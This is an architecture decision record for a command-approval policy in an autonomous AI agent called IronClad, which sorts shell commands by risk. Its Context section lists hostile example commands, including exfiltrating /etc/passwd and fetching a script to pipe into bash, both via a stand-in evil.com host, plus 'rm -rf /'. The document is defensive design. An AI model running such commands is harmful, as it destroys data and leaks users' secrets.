# ADR-001: Traffic Light Security Policy

## Title

Traffic Light Command Classification Policy

## Status

Accepted

## Context

IronClad is an autonomous AI agent that executes shell commands based on LLM outputs. This presents a significant security risk: the LLM could generate malicious or destructive commands that could:

1. Delete important files (`rm -rf /`)
2. Exfiltrate data (`curl -X POST https://evil.com --data @/etc/passwd`)
3. Install malware (`curl https://evil.com/malware.sh | bash`)
4. Modify system configuration (`sudo chmod 777 /`)

We need a security policy that:
- Allows safe, read-only operations without user intervention
- Requires confirmation for potentially dangerous operations
- Blocks strictly forbidden operations
- Is transparent and auditable

## Decision

We implement a "Traffic Light" security policy that classifies all commands into four categories:

### 🟢 Green (Auto-Approved)
Safe, read-only operations that cannot modify the system:
- `ls`, `cat`, `grep`, `head`, `tail`, `echo`, `pwd`
- `find`, `tree`, `wc`, `sort`, `uniq`, `diff`
- `whoami`, `hostname`, `date`, `uname`

### 🟡 Yellow (User Confirmation)
Potentially impactful operations that modify files within the workspace:
- `touch`, `mkdir`, `cp`, `mv`
- File writes using `cat > file` or `echo > file`
- Non-destructive modifications

### 🔴 Red (Explicit Confirmation Required)
Dangerous operations that could cause significant harm:
- Network operations: `curl`, `wget`, `nc`, `ssh`, `scp`
- Destructive operations: `rm`, `chmod`, `chown`
- Privilege escalation: `sudo`, `su`
- Package installation: `apt install`, `npm install`
- Script execution: `python script.py`, `bash script.sh`

### 🚫 Blocked (Cannot Be Approved)
Operations that are strictly forbidden:
- Absolute path access (`/etc/passwd`, `C:\Windows\System32`)
- Directory traversal (`../secrets`)
- Home directory access (`~/.ssh/id_rsa`)

## Implementation

The policy is implemented in `src/governor/policy.rs`:

```rust
pub enum TrafficLight {
    Green,    // Auto-approved
    Yellow,   // Notify user
    Red,      // Require explicit confirmation
    Blocked,  // Cannot be approved
}
```

### Compound Command Handling

Commands with pipes (`|`), chains (`&&`, `||`), or subshells (`$()`) are split and each segment is classified independently. The highest risk level wins.

Example: `ls | grep foo` → Green
Example: `ls && rm -rf /` → Red

### Path Safety

Additional validation ensures commands cannot escape the workspace:
- Absolute paths are blocked
- Directory traversal (`..`) is blocked
- Home directory expansion (`~`) is blocked

## Consequences

### Positive
- Clear, visual security model that users understand
- Minimal friction for safe operations
- Strong protection against accidental damage
- Audit trail of all security decisions

### Negative
- May block legitimate operations in some edge cases
- Requires user to be present for Yellow/Red operations
- Could be bypassed by sophisticated prompt injection

### Mitigations
- Trusted Telegram users can bypass Yellow/Red (configurable)
- All decisions are logged for audit
- Policy patterns are configurable via code

## Alternatives Considered

### 1. Allowlist-Only
Only explicitly allowed commands could run. Rejected because it would be too restrictive and require constant updates.

### 2. Sandbox-Only
Run all commands in a sandbox with no host access. Rejected because it prevents useful operations like file creation.

### 3. AI-Based Classification
Use an LLM to classify command safety. Rejected because it adds latency, cost, and potential for misclassification.

### 4. Capability-Based Security
Require explicit capability grants for each operation type. Rejected as too complex for the initial implementation.

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Principle of Least Privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege)
- [Zero Trust Architecture](https://www.nist.gov/publications/zero-trust-architecture)
